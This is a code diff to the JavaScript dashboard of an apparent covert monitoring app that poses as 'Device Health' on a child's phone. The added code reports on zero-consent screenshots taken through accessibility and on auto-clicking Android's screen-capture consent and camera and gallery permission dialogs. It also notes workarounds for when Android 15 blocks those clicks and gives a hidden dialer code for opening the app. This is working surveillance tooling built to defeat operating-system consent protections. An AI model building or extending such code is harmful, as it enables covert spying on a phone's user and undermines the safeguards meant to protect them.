@@ -7,8 +7,12 @@
 // hota tha, isliye koi bhi update install-over-existing kabhi nahi hota tha.
 // v1.11/vc12: camera permission background auto-request (CameraPermActivity) +
 // Phone check me Gallery/Camera permission rows + health me gallery flag.
-const LATEST_VC = 12;
-const LATEST_V = "1.11";
+// v1.12/vc13: screenshot ZERO-TOUCH (a11y takeScreenshot, consent nahi chahiye);
+// consent auto-click ab SAARI a11y windows scan karta hai + honest diag
+// (clickPassRuns/SawBtn/dialogPkg/consentResult) se Phone check exact batata hai
+// ki Live ke liye child par "Start now" manually dabana hai ya nahi.
+const LATEST_VC = 13;
+const LATEST_V = "1.12";
 
 const S = {
   token: localStorage.getItem("fg_token") || "",
@@ -1402,8 +1406,20 @@ function renderMirrorDiag(d) {
     vc === null ? "pata nahi (purana build)" : "v" + (h.versionName || "") + " (build " + vc + ")" + (vc >= LATEST_VC ? " — latest ✓" : " — PURANA"),
     vc !== null && vc < LATEST_VC ? "Set tab → “📲 Child app abhi update karo”" : ""));
   rows.push("<li>🤖 <b>Android:</b> " + androidName + (d.device ? " · " + esc(d.device) : "") + "</li>");
-  if (d.consentPending) rows.push("<li>⏳ <b>Consent dialog:</b> request ho chuki hai, abhi grant nahi hui — 5–10 sec ruko" + (d.consentUiSeen === false ? " · <b>⚠️ dialog bachche ke phone par KHULA HI NAHI</b> (OEM ne block kiya)" : "") + "</li>");
-  if (d.capturePending) rows.push("<li>📸 <b>Screenshot:</b> consent ka intezaar — naya build consent milte hi khud capture karke bhej dega, dobara tap ki zaroorat nahi</li>");
+  if (d.consentPending) {
+    // vc13 honest diag: dialog khula tha? button a11y ko dikha tha? result kya raha?
+    let extra = "";
+    if (d.consentResult === "denied") extra = " · <b>⚠️ pichhli baar CANCEL dab gaya tha</b> — is baar dialog par “Start now” dabao";
+    else if (d.consentResult === "timeout") extra = " · pichhli koshish me confirm nahi hua (40s timeout)";
+    if (d.consentUiSeen === false) extra += " · <b>⚠️ dialog bachche ke phone par KHULA HI NAHI</b> (OEM ne block kiya)";
+    else if (typeof d.clickPassRuns === "number" && d.clickPassRuns > 0) {
+      extra += d.clickPassSawBtn === true
+        ? " · auto-click ne dialog ka button DEKHA par confirm nahi hua (Android 15 protection)"
+        : " · auto-click ne “Start now” button DEKHA HI NAHI (a11y window list me dialog nahi aaya)";
+    }
+    rows.push("<li>⏳ <b>Consent dialog:</b> request ho chuki hai, abhi grant nahi hui — 5–10 sec ruko" + extra + "</li>");
+  }
+  if (d.capturePending) rows.push("<li>📸 <b>Screenshot:</b> consent ka intezaar — sirf Android <11 / a11y OFF par hota hai; build 13 se screenshot a11y se aata hai, consent chahiye hi nahi</li>");
   rows.push(diagRow(d.screenOn === true, "Bachche ki screen", d.screenOn ? "ON ✓" : "OFF — frames isliye nahi aa rahe", d.screenOn ? "" : "Phone screen ON karo, frames khud aane lagenge"));
   rows.push(diagRow(h.mirrorReady === true, "Screen capture consent", h.mirrorReady ? "granted ✓" : "abhi nahi", h.mirrorReady ? "" : "Mirror shuru dabao — dialog khud khulega aur confirm hoga"));
   rows.push(diagRow(h.accessibility !== false, "Accessibility", h.accessibility === false ? "OFF" : "ON ✓", h.accessibility === false ? "Settings → Accessibility → Device Health → ON (consent auto-confirm isi se hota hai)" : ""));
@@ -1413,6 +1429,9 @@ function renderMirrorDiag(d) {
   // missing hai.
   if (typeof d.galleryPerm === "boolean") rows.push(diagRow(d.galleryPerm, "Gallery permission", d.galleryPerm ? "granted ✓" : "NAHI MILI — gallery isliye khaali hai", d.galleryPerm ? "" : "Live tab → “📸 Gallery kholo” dobara dabao — dialog khud khulega aur auto-Allow hoga (a11y ON ho to)"));
   if (typeof d.cameraPerm === "boolean") rows.push(diagRow(d.cameraPerm, "Camera permission", d.cameraPerm ? "granted ✓" : "NAHI MILI — selfie/back cam isliye fail", d.cameraPerm ? "" : "Quick actions me “📷 Back cam” dobara dabao — permission dialog khud Allow ho jayega (a11y ON ho to)"));
+  // vc13: screenshot ab a11y takeScreenshot se aata hai (zero-touch) — capability
+  // report me dikhao taaki a11y OFF/capability miss turant pakda jaye.
+  if (typeof d.a11yShot === "boolean") rows.push(diagRow(d.a11yShot, "Screenshot (a11y)", d.a11yShot ? "ready ✓ — consent ke bina capture hoga" : "ready NAHI (a11y OFF ya capability miss)", d.a11yShot ? "" : "Settings → Accessibility → Device Health → OFF karke fir ON karo, phir Phone check dobara"));
   rows.push(diagRow(h.overlay !== false, "Display over apps", h.overlay === false ? "OFF" : "ON ✓", h.overlay === false ? "Settings → Apps → Device Health → Display over other apps → Allow" : ""));
   rows.push(diagRow(h.canInstall !== false, "Install unknown apps", h.canInstall === false ? "OFF (auto-update nahi hoga)" : "ON ✓", h.canInstall === false ? "Settings → Apps → Device Health → Install unknown apps → Allow" : ""));
   if (typeof d.frames === "number") rows.push("<li>🎞 <b>Frames (is session):</b> " + d.frames + (d.lastFrameAgoSec != null ? " · last frame " + d.lastFrameAgoSec + "s pehle" : "") + "</li>");
@@ -1433,6 +1452,9 @@ function renderMirrorDiag(d) {
   else if (d.cameraPerm === false) verdict = "👉 <b>Camera permission nahi mili — Quick actions me “📷 Back cam” dobara dabao: dialog khud Allow ho jayega, phir shot lag jayega.</b>";
   else if (h.overlay === false) verdict = "👉 <b>Display over apps OFF hai — background me consent khulti hi nahi. Allow karo, phir dobara try karo.</b>";
   else if (d.consentPending && d.consentUiSeen === false) verdict = "👉 <b>Consent dialog bachche ke phone par khula HI nahi (OEM ne block kiya). Bachche ke phone par Device Health app ek baar kholo (dial *#*#2724#*#*), phir Live tab se Mirror dobara shuru karo.</b>";
+  else if (d.consentPending && d.consentResult === "denied") verdict = "👉 <b>Pichhli baar consent dialog par CANCEL dab gaya tha. Mirror band karke dobara shuru karo — dialog aaye to “Start now” dabana zaroori hai (Live streaming ke liye Android ko har baar permission chahiye).</b>";
+  else if (d.consentPending && d.clickPassRuns > 0 && d.clickPassSawBtn === false) verdict = "👉 <b>Dialog khula par a11y click ko dialog nahi dikha. Ab ke Android 15 me system consent par auto-click rok deta hai — Live ke liye bachche ke phone par dialog ka “Start now” EK BAAR khud dabao. 📸 Screenshot ki zaroorat nahi — wo ab a11y se khud aayega (build 13).</b>";
+  else if (d.consentPending && d.clickPassSawBtn === true) verdict = "👉 <b>Auto-click ne “Start now” dekha par confirm nahi hua — Android 15 ne click block kiya hoga. Bachche ke phone par dialog khud dikhega, wahan “Start now” EK BAAR dabao — Live turant chalega. 📸 Screenshot ab khud chalega (a11y path).</b>";
   else if (d.consentPending) verdict = "👉 <b>Consent abhi confirm ho raha hai — 10 sec ruko. Phir bhi screen na aaye to Mirror band karke dobara shuru karo.</b>";
   else if ((d.frames || 0) === 0 && h.mirrorReady !== true) verdict = "👉 <b>Capture session start nahi hua — Mirror band karo, 5 sec ruko, phir dobara “▶ Mirror shuru karo” dabao.</b>";
   else verdict = "👉 <b>Phone side theek lag raha hai — 5–10 sec me frames aane chahiye. Nahi aaye to Mirror band → dobara shuru karo.</b>";
